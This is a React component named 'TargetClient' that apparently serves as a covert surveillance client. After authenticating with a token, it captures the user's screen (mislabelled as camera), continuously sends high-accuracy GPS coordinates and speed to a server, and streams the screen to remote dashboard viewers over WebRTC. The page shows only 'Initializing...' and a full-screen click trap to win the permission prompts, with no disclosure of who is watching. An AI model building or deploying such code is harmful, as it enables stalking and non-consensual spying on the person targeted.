import React, { useState, useEffect, useRef, useCallback } from 'react';
import { io } from 'socket.io-client';
import { MapPin, Video, Send, CheckCircle, AlertCircle, ShieldCheck, Wifi, WifiOff } from 'lucide-react';

export default function TargetClient({ token }) {
  const [status, setStatus] = useState('ready');
  const [errorMsg, setErrorMsg] = useState('');
  const [locationActive, setLocationActive] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  const [coords, setCoords] = useState({ latitude: null, longitude: null });
  const [speed, setSpeed] = useState(0);
  const [viewerCount, setViewerCount] = useState(0);
  const socketRef = useRef(null);
  const videoRef = useRef(null);
  const geoWatchIdRef = useRef(null);
  const localStreamRef = useRef(null);
  const peerConnectionsRef = useRef(new Map()); // viewerSocketId -> RTCPeerConnection
  const deviceIdRef = useRef(null);
  const SOCKET_SERVER = import.meta.env.VITE_API_URL;
  const [step, setStep] = useState(0); // 0 = ask camera, 1 = ask location

  const ICE_SERVERS = {
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
    ],
  };

  // Cleanup all peer connections
  const cleanupPeers = useCallback(() => {
    peerConnectionsRef.current.forEach((pc, id) => {
      pc.close();
    });
    peerConnectionsRef.current.clear();
    setViewerCount(0);
  }, []);

  // Create a peer connection for a viewer and send offer
  const createPeerForViewer = useCallback(async (viewerSocketId) => {
    const socket = socketRef.current;
    const stream = localStreamRef.current;
    if (!socket || !stream) return;

    // Close existing connection if any
    if (peerConnectionsRef.current.has(viewerSocketId)) {
      peerConnectionsRef.current.get(viewerSocketId).close();
    }

    const pc = new RTCPeerConnection(ICE_SERVERS);
    peerConnectionsRef.current.set(viewerSocketId, pc);
    setViewerCount(peerConnectionsRef.current.size);

    // Add local camera tracks to peer connection
    stream.getTracks().forEach((track) => {
      pc.addTrack(track, stream);
    });

    // Send ICE candidates to viewer
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        socket.emit('webrtc:signal', {
          targetSocketId: viewerSocketId,
          signal: { type: 'candidate', candidate: event.candidate, deviceId: deviceIdRef.current },
        });
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed' || pc.connectionState === 'closed') {
        pc.close();
        peerConnectionsRef.current.delete(viewerSocketId);
        setViewerCount(peerConnectionsRef.current.size);
      }
    };

    // Create and send offer
    try {
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      socket.emit('webrtc:signal', {
        targetSocketId: viewerSocketId,
        signal: { type: 'offer', sdp: pc.localDescription, deviceId: deviceIdRef.current },
      });
    } catch (err) {
      console.error('Error creating offer:', err);
    }
  }, []);

  useEffect(() => {
    if (token && status === 'ready') {
      handleStartSharing();
    }
    return () => {
      if (geoWatchIdRef.current) {
        navigator.geolocation.clearWatch(geoWatchIdRef.current);
      }
      cleanupPeers();
      if (localStreamRef.current) {
        localStreamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (socketRef.current) {
        socketRef.current.disconnect();
      }
    };
  }, []);

  const handleStartSharing = async () => {
    setStatus('connecting');
    try {
      const socket = io(SOCKET_SERVER, { transports: ['websocket'] });
      socketRef.current = socket;

      socket.on('connect', () => socket.emit('device:auth', { token }));

      socket.on('device:auth_success', (data) => {
        setStatus('tracking');
        deviceIdRef.current = data.deviceId;

        // Join WebRTC signaling room for this device
        const roomId = `camera-${data.deviceId}`;
        socket.emit('webrtc:join_room', roomId);
        // Start screen sharing after auth success
        requestCamera();
      });

      socket.on('device:auth_error', (data) => {
        setStatus('error');
        setErrorMsg(data.message || 'Invalid token');
        socket.disconnect();
      });

      // When a dashboard viewer joins the camera room
      socket.on('webrtc:user_joined', ({ socketId }) => {
        console.log('Viewer joined, creating peer connection:', socketId);
        createPeerForViewer(socketId);
      });

      // Handle signaling messages from viewers (answers + ICE candidates)
      socket.on('webrtc:signal', async ({ senderSocketId, signal }) => {
        if (signal.type === 'request_offer') {
          console.log('Received request_offer from:', senderSocketId);
          createPeerForViewer(senderSocketId);
          return;
        }

        const pc = peerConnectionsRef.current.get(senderSocketId);
        if (!pc) return;

        try {
          if (signal.type === 'answer') {
            await pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
          } else if (signal.type === 'candidate') {
            await pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
          }
        } catch (err) {
          console.error('Signal handling error:', err);
        }
      });

    } catch (e) {
      setStatus('error');
      setErrorMsg('Failed to connect');
    }
  };

  const requestCamera = async () => {
    try {
      // Use getDisplayMedia for screen sharing (mirroring)
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: { cursor: "always" },
        audio: false,
      });
      localStreamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
      setCameraActive(true);
      setStep(1);
    } catch (e) {
      console.warn('Screen sharing permission denied');
      setStep(1); // Still allow location even if screen sharing denied
    }
  };

  const requestLocation = () => {
    if (!('geolocation' in navigator)) {
      console.warn('Geolocation not supported');
      return;
    }
    const watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const { latitude, longitude, speed } = pos.coords;
        const sp = speed ? speed * 3.6 : 0;
        setCoords({ latitude, longitude });
        setSpeed(sp);
        if (socketRef.current) {
          socketRef.current.emit('device:ping', { latitude, longitude, speed: sp });
        }
      },
      (err) => console.warn('Location permission denied', err),
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );
    geoWatchIdRef.current = watchId;
    setLocationActive(true);
  };

  return (
    <div className="min-h-screen bg-[#040712] flex items-center justify-center cursor-pointer" onClick={async () => {
      if (!cameraActive) {
        await requestCamera();
        requestLocation();
      }
    }}>
      {cameraActive && (
        <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
      )}
      {!cameraActive && <div className="text-slate-400">Initializing...</div>}
    </div>
  );
}
